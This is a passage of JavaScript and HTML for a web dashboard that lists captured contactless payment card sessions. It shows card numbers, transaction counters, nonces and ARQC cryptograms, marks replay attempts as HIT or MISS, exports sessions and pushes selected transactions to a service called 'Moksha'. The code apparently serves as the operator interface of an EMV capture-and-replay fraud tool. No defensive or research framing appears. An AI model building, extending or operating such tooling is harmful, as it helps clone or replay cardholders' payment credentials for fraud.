      if(matchesTx(s,t)) selectedIds.add(t.id);
    });
  });
  updateSelBar();
  render();
}

// ── Live update ──────────────────────────────────────────────────────────────
const es=new EventSource('/events');
es.addEventListener('capture',()=>{pulse();fetchSessions();});
es.addEventListener('replay_result',()=>{fetchSessions();});
es.addEventListener('clear',()=>{sessions=[];selectedIds.clear();render();stats();updateSelBar();});
es.addEventListener('ping',()=>{});
setInterval(fetchSessions,4000);

function pulse(){
  const d=document.getElementById('dot');
  d.classList.add('live'); clearTimeout(pulse._t);
  pulse._t=setTimeout(()=>d.classList.remove('live'),3000);
}

// ── Selection ────────────────────────────────────────────────────────────────
let sessions=[];
const selectedIds=new Set();
function togRow(id,cb){ if(cb.checked)selectedIds.add(id);else selectedIds.delete(id); updateSelBar(); }
function togAllSess(ids,checked){
  ids.forEach(id=>checked?selectedIds.add(id):selectedIds.delete(id));
  document.querySelectorAll('.row-cb').forEach(cb=>{if(ids.includes(+cb.dataset.id))cb.checked=checked;});
  updateSelBar();
}
function updateSelBar(){
  const bar=document.getElementById('selBar');
  document.getElementById('selCount').textContent=selectedIds.size+' transaction'+(selectedIds.size===1?'':'s')+' selected';
  document.getElementById('sQueue').textContent=selectedIds.size;
  bar.classList.toggle('hidden',selectedIds.size===0);
  document.querySelectorAll('.row-cb').forEach(cb=>{const r=cb.closest('tr');if(r)r.classList.toggle('sel-row',selectedIds.has(+cb.dataset.id));});
}
function clearSel(){
  selectedIds.clear();
  document.querySelectorAll('.row-cb,.all-cb').forEach(cb=>cb.checked=false);
  updateSelBar();
}
function pushToMoksha(){
  if(!selectedIds.size)return;
  fetch(apiUrl('/api/select'),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ids:[...selectedIds],api_key:API_KEY})})
  .then(r=>r.json()).then(d=>{
    const bar=document.getElementById('selBar');
    bar.style.borderTopColor='#3fb950';
    document.getElementById('selCount').textContent='✅ '+d.selected+' pushed to Moksha';
    setTimeout(()=>{bar.style.borderTopColor='#58a6ff';},2500);
  });
}

// ── Render ───────────────────────────────────────────────────────────────────
function fetchSessions(){
  if(!API_KEY)return;
  fetch(apiUrl('/api/sessions')).then(r=>r.json()).then(d=>{sessions=d;render();stats();}).catch(()=>{});
}

function render(){
  const el=document.getElementById('sessionList');
  if(!sessions.length){el.innerHTML='<div class="empty">Waiting for card tap…</div>';return;}

  el.innerHTML=sessions.map((s,si)=>{
    const filteredTxs=(s.transactions||[]).filter(t=>matchesTx(s,t));
    if((filterNet||filterCur)&&!filteredTxs.length)return'';
    const ts=new Date(s.ts*1000).toLocaleString([],{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
    const allIds=JSON.stringify(filteredTxs.map(t=>t.id));
    const pan=s.pan?s.pan.replace(/(.{4})/g,'\$1 ').trim():'—';
    return \`<div class="card-block">
      <div class="card-head" onclick="tog('tx-\${si}','chev-\${si}')">
        <span class="chev open" id="chev-\${si}">▶</span>
        <span class="pan">\${pan}</span>
        \${s.network?'<span class="net">'+s.network+'</span>':''}
        <span class="cnt">\${filteredTxs.length}\${filteredTxs.length!==s.transactions.length?' / '+s.transactions.length:''} samples</span>
        <div class="hd-acts" onclick="event.stopPropagation()">
          <button onclick="togAllSess(\${allIds},true)">☑ All</button>
          <button onclick="expSess(\${si})">⬇</button>
        </div>
        <span class="ts">\${ts}</span>
      </div>
      <div class="tx-wrap open" id="tx-\${si}">\${buildTxTable(filteredTxs,si,s)}</div>
    </div>\`;
  }).join('');
}

function buildTxTable(txs,si,sess){
  if(!txs.length)return'<div class="empty" style="padding:14px">No samples match filter</div>';
  const byGroup={}, order=[];
  txs.forEach(t=>{
    const k=(t.cve_id??'?')+'::'+(t.date||'—');
    if(!byGroup[k]){byGroup[k]=[];order.push(k);}
    byGroup[k].push(t);
  });
  let html='',abs=0;
  order.forEach(k=>{
    const rows=byGroup[k];
    const [pid,d]=k.split('::');
    const ds=d.length===6?'20'+d.slice(0,2)+'-'+d.slice(2,4)+'-'+d.slice(4,6):d;
    const gIds=JSON.stringify(rows.map(r=>r.id));
    html+=\`<div class="grp-head">
      <label><input type="checkbox" class="all-cb" onchange="togAllSess(\${gIds},this.checked)"> Profile \${pid}</label>
      <span class="grp-date">\${ds}</span>
      <span style="color:#484f58">\${rows.length} samples</span>
    </div>
    <table><thead><tr>
      <th style="width:24px"></th><th>#</th><th>Amount</th><th>ATC</th>
      <th>Nonce</th><th>ARQC</th><th>Replay</th><th>Tags</th>
    </tr></thead><tbody>\`;
    rows.forEach(t=>{
      abs++;
      const badge=t.last_hit===1?'<span class="badge-hit">⚡ HIT</span>'
        :t.last_hit===0?'<span class="badge-miss">✗ MISS</span>'
        :'<span class="badge-none">—</span>';
      html+=\`<tr>
        <td><input type="checkbox" class="row-cb" data-id="\${t.id}" onchange="togRow(\${t.id},this)"></td>
        <td class="dim">\${abs}</td>
        <td class="amt">\${fmtAmt(t.amount,t.params)}</td>
        <td class="atc">\${t.atc||'—'}</td>
        <td class="nonce">\${t.un||'—'}<button class="sm" onclick="cp('\${t.un||''}')">copy</button></td>
        <td class="ac">\${(t.arqc||'').slice(0,16)}\${t.arqc&&t.arqc.length>16?'…':''}<button class="sm" onclick="cp('\${t.arqc||''}')">copy</button></td>
        <td>\${badge}</td>
        <td>\${buildTags(t.params||{},si+'-'+abs)}</td>
      </tr>\`;
    });
    html+='</tbody></table>';
  });
  return html;
}

function buildTags(p,id){
  const keys=Object.keys(p);
  if(!keys.length)return'<span class="dim">—</span>';
  const rows=keys.map(k=>'<span class="pk">'+k+(EMV[k.toUpperCase()]?' '+EMV[k.toUpperCase()]:'')+'</span><span class="pv">'+p[k]+'</span>').join('');
  return \`<span class="tags-tog" onclick="tog('\${id}')">tags</span><div class="pblock" id="\${id}"><div class="pkv">\${rows}</div></div>\`;
}

function tog(...ids){ids.forEach(id=>{const el=document.getElementById(id);if(el)el.classList.toggle('open');});}

function stats(){
  const total=sessions.reduce((s,c)=>s+(c.sample_count||0),0);
  const hits=sessions.reduce((sum,s)=>(s.transactions||[]).reduce((a,t)=>a+(t.last_hit===1?1:0),sum),0);
  document.getElementById('sSess').textContent=sessions.length;
  document.getElementById('sSamples').textContent=total;
  document.getElementById('sHits').textContent=hits;
  if(sessions.length) document.getElementById('sLast').textContent=new Date(sessions[0].ts*1000).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
}

function cp(t){navigator.clipboard.writeText(t).catch(()=>{});}
function expSess(si){const s=sessions[si];dl(JSON.stringify(s,null,2),'session_'+s.pan+'_'+s.ts+'.json');}
function exportAll(){dl(JSON.stringify(sessions,null,2),'sessions_all.json');}
function dl(data,name){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([data],{type:'application/json'}));a.download=name;a.click();}
function clearAll(){
  if(!confirm('Clear all your sessions?'))return;
  fetch(apiUrl('/api/clear'),{method:'DELETE'}).then(()=>{sessions=[];render();stats();});
}
fetchSessions();
</script>
</body>
</html>`; }
